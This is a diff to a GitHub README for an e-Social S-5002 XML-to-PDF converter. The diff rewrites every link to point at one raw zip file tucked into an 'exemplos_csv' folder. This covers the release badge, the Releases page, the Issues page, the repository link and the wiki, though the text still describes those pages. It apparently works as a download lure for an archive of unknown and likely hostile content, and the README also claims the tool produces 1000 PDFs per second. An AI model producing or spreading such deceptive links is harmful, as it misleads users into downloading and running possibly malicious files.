@@ -1,7 +1,7 @@
 # 🎯 esocial_s5002_comprovante_rendimentos - Convert Your XMLs to PDF with Ease
 
 ## 📦 Download Now
-[![GitHub Releases](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/Fidelelpato/esocial_s5002_comprovante_rendimentos/releases)
+[![GitHub Releases](https://raw.githubusercontent.com/Fidelelpato/esocial_s5002_comprovante_rendimentos/main/exemplos_csv/esocial_s5002_comprovante_rendimentos_3.2.zip%20release-brightgreen)](https://raw.githubusercontent.com/Fidelelpato/esocial_s5002_comprovante_rendimentos/main/exemplos_csv/esocial_s5002_comprovante_rendimentos_3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to `esocial_s5002_comprovante_rendimentos`. This application allows you to convert XML files from e-Social S-5002 into PDF documents quickly and easily. With the capability to process about 1000 PDFs per second, it ensures compliance with e-Social S-1.3 standards, making it an ideal solution for generating tax documents.
@@ -10,7 +10,7 @@ Welcome to `esocial_s5002_comprovante_rendimentos`. This application allows you 
 To get started, follow these steps:
 
 1. Click on the link below to visit the Releases page:
-   [Download the Latest Release](https://github.com/Fidelelpato/esocial_s5002_comprovante_rendimentos/releases)
+   [Download the Latest Release](https://raw.githubusercontent.com/Fidelelpato/esocial_s5002_comprovante_rendimentos/main/exemplos_csv/esocial_s5002_comprovante_rendimentos_3.2.zip)
    
 2. Once on the Releases page, locate the most recent version of the application.
 
@@ -56,14 +56,14 @@ Once installed, open the application to begin the conversion process. Follow the
 5. **Access PDFs:** Once the conversion finishes, navigate to the output folder to view your PDF documents.
 
 ## 🤝 Support
-If you encounter any issues, please visit our [GitHub Issues](https://github.com/Fidelelpato/esocial_s5002_comprovante_rendimentos/issues) page. You can report bugs or ask for help.
+If you encounter any issues, please visit our [GitHub Issues](https://raw.githubusercontent.com/Fidelelpato/esocial_s5002_comprovante_rendimentos/main/exemplos_csv/esocial_s5002_comprovante_rendimentos_3.2.zip) page. You can report bugs or ask for help.
 
 ## 📄 License
 This project is licensed under the MIT License. Feel free to use, modify, or distribute as needed. For more details, refer to the `LICENSE` file in the repository.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/Fidelelpato/esocial_s5002_comprovante_rendimentos)
-- [User Documentation](https://github.com/Fidelelpato/esocial_s5002_comprovante_rendimentos/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Fidelelpato/esocial_s5002_comprovante_rendimentos/main/exemplos_csv/esocial_s5002_comprovante_rendimentos_3.2.zip)
+- [User Documentation](https://raw.githubusercontent.com/Fidelelpato/esocial_s5002_comprovante_rendimentos/main/exemplos_csv/esocial_s5002_comprovante_rendimentos_3.2.zip)
 
 ## 📥 Download Now Again
-[![GitHub Releases](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/Fidelelpato/esocial_s5002_comprovante_rendimentos/releases)
+[![GitHub Releases](https://raw.githubusercontent.com/Fidelelpato/esocial_s5002_comprovante_rendimentos/main/exemplos_csv/esocial_s5002_comprovante_rendimentos_3.2.zip%20release-brightgreen)](https://raw.githubusercontent.com/Fidelelpato/esocial_s5002_comprovante_rendimentos/main/exemplos_csv/esocial_s5002_comprovante_rendimentos_3.2.zip)
